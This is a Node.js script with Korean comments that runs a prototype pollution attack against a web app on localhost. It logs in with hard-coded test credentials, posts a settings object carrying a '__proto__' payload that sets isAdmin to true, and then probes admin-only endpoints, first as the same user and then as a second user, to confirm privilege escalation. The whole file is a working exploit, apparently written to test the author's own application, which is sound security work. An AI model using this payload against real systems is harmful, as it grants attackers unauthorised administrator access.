const axios = require('axios');

async function testPrototypePollution() {
  try {
    // 1. 로그인
    const loginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'bitcoin@example.com',
      password: 'BitcoinMoon$'
    });
    
    const token = loginResponse.data.token;
    console.log('✅ 로그인 성공');
    
    // 2. Prototype Pollution 공격
    console.log('\n🔥 Prototype Pollution 공격 실행...');
    const pollutionResponse = await axios.post('http://localhost:5000/api/settings/preferences', {
      settings: {
        theme: 'dark',
        "__proto__": {
          "isAdmin": true
        }
      }
    }, {
      headers: { Authorization: `Bearer ${token}` }
    });
    
    console.log('공격 응답:', pollutionResponse.data);
    
    // 3. 즉시 관리자 기능 접근 시도
    console.log('\n🎯 관리자 기능 접근 시도...');
    try {
      const adminResponse = await axios.post('http://localhost:5000/api/settings/global-settings', {
        key: 'hacked_setting',
        value: 'prototype_pollution_success'
      }, {
        headers: { Authorization: `Bearer ${token}` }
      });
      
      console.log('🚨 즉시 권한 우회 성공!', adminResponse.data);
    } catch (err) {
      console.log('즉시 접근 실패:', err.response.data);
    }
    
    // 4. 다른 사용자로 로그인해도 영향받는지 테스트
    console.log('\n🔄 다른 사용자로 테스트...');
    const otherLoginResponse = await axios.post('http://localhost:5000/api/users/login', {
      email: 'trader@example.com',
      password: 'TradePro88#'
    });
    
    const otherToken = otherLoginResponse.data.token;
    
    try {
      const otherAdminResponse = await axios.post('http://localhost:5000/api/settings/global-settings', {
        key: 'another_hack',
        value: 'other_user_also_admin'
      }, {
        headers: { Authorization: `Bearer ${otherToken}` }
      });
      
      console.log('🚨 다른 사용자도 관리자 권한 획득!', otherAdminResponse.data);
    } catch (err) {
      console.log('다른 사용자 접근 실패:', err.response.data);
    }
    
  } catch (error) {
    console.error('테스트 오류:', error.response?.data || error.message);
  }
}

testPrototypePollution();
